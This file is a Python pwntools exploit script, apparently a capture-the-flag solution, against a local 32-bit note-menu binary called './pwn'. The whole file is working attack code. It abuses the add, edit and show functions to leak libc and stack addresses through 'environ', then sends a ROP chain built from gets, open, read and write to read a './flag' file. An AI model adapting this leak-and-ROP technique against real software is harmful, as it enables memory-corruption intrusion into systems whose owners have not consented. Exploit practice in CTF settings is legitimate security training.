from pwn import *

sh = process("./pwn")
#context.log_level = 'debug'
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

'''
0x000283e2 : pop eax ; ret
0x000a1101 : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x00163c1b : pop ebp ; pop ebx ; ret
0x000444c0 : pop ebp ; pop esi ; pop edi ; ret
'''
pop_ret = 0x000283e2
pop2_ret = 0x00163c1b
pop3_ret = 0x000444c0
pop4_ret = 0x000444bf

def add(choice, index, content):
	sh.recvuntil("ce:")
	sh.sendline("1")
	sh.recvuntil("pe ?")
	sh.sendline(str(choice))
	sh.recvuntil("ld")
	sh.sendline(str(index))
	sh.recvuntil("tent ?")
	sh.send(content + " ")

def show(index):
	sh.recvuntil("ce:")
	sh.sendline("3")
	sh.recvuntil("show?")
	sh.send(str(index) + " ")
	
def edit(index, content):
	sh.recvuntil("ce:")
	sh.sendline("2")
	sh.recvuntil("nge?")
	sh.sendline(str(index))
	sh.recvuntil("tent ?")
	sh.send(content + " ")

def edit1(index, content):
	sh.recvuntil("ce:")
	sh.sendline("2")
	sh.recvuntil("nge?")
	sh.sendline(str(index))
	sh.recvuntil("tent ?")
	sh.send(content + b" ")
	

for i in range(20):
	add(1,str(i),'a'*0x30) #0 - 19
for i in range(20):
	edit(str(i), 'a'*0x40)
add(1, 200, 'a'*0x3ff) #200
#attach(sh)
for i in range(20):
	edit1(str(i),p32(0xffffffff))
show(18)
sh.recvuntil("ONTENT: ")
addr = u32(sh.recv(4))
log.info("addr:"+hex(addr))
libcbase = addr - 0x1eb8f8
log.info("libcbase:"+hex(libcbase))
#attach(sh)
#raw_input()
target = libcbase + 0x1ed098 + 1
log.info("target:"+hex(target))
payload = p32(0xffffffff) + p32(target)
edit1(17, payload)

show(17)
#attach(sh)
sh.recvuntil("ONTENT: ")
addr = u32(sh.recv(3).rjust(4,b'\x00'))
log.info("addr:"+hex(addr))

payload = p32(0xffffffff) + p32(libcbase + libc.symbols['environ'])
edit1(17, payload)

show(17)
#attach(sh)
sh.recvuntil("ONTENT: ")
stack = u32(sh.recv(4))
log.info("addr:"+hex(stack))


payload = b'x'*4 + p32(target - 0x100) * 8 + p32(libc.symbols['gets'] +libcbase - 1 ) + p32(libcbase + pop4_ret) + p32(stack - 0x108 - 1)
log.info(hex(libc.symbols['gets'] + libcbase))
#raw_input()
edit1(17,payload)

edit1(16, p32(0xffffffff) + p32(addr - 0x1c630 + 1))
#attach(sh, "b*$rebase(0x2413)")
#raw_input()
show(16)

payload = p32(libcbase + libc.symbols['open']) + p32(libcbase + pop2_ret) + p32(stack - 0xd0) + p32(0)
payload += p32(libcbase + libc.symbols['read']) + p32(libcbase + pop3_ret) + p32(3) + p32(stack) + p32(0x100)
payload += p32(libcbase + libc.symbols['write']) + p32(libcbase + pop3_ret) + p32(1) + p32(stack) + p32(0x100)
payload += b"./flag"
#raw_input()
sh.sendline(payload)
#attach(sh)	

sh.interactive()
